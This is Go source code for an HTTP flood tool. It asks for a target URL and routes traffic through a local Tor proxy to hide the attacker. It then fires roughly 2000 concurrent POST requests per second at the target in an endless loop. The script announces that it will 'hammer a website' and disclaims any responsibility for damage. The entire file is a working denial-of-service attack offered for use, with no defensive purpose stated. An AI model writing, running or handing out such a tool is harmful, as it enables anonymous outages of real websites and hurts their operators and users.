package main

import (
	"log"
	"net/http"
	"net/url"
	"time"
	"bufio"
	"fmt"
	"os"
	"strings"
	"runtime"
	"github.com/inancgumus/screen"
	"math/rand"
)

// Specify Tor proxy ip and port
var torProxy string = "socks5://127.0.0.1:9050" // 9150 w/ Tor Browser

func main() {
	screen.Clear()
	screen.Clear()
	fmt.Println(asciiArt)
	fmt.Println("This script will hammer a website with POST requests.")
	fmt.Println("I am NOT responsible for ANYTHING you do with my code or any damage you may cause!")
	fmt.Println("Wait 30 seconds before checking the status of your target after the attack begins.")
	runtime.GOMAXPROCS(0)
	//Ask user for URL
	fmt.Println("Enter URL:")
	reader := bufio.NewReader(os.Stdin)
	webUrl, _ := reader.ReadString('\n')
	webUrl = strings.Replace(webUrl, "\n", "", -1)

	// Parse Tor proxy URL string to a URL type
	torProxyUrl, err := url.Parse(torProxy)
	if err != nil {
		log.Fatal("Error parsing Tor proxy URL:", torProxy, ".", err)
	}

	// Set up a custom HTTP transport to use the proxy and create the client
	torTransport := &http.Transport{Proxy: http.ProxyURL(torProxyUrl)}
	client := &http.Client{Transport: torTransport, Timeout: time.Second * 2}

	screen.Clear()
	fmt.Println("Wait for the timeout...")
	fmt.Println("Starting Attack!")
	screen.Clear()

	//Form data for POST request
	qwerty := "0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
	formData := url.Values {
        	string(string(qwerty[rand.Intn(len(qwerty))])): {string(string(qwerty[rand.Intn(len(qwerty))]))},
	}
	fmt.Println("Hammering Website...")
	for {
		time.Sleep(1 * time.Second)
		k := 0
		for k < 2000 {
			k +=1
			go func() {
				time.Sleep(2 * time.Second)
				// Make request
				resp, err := client.PostForm(webUrl, formData)
				if err != nil {
					return
				}
				resp.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
			}()
		}
	}
}
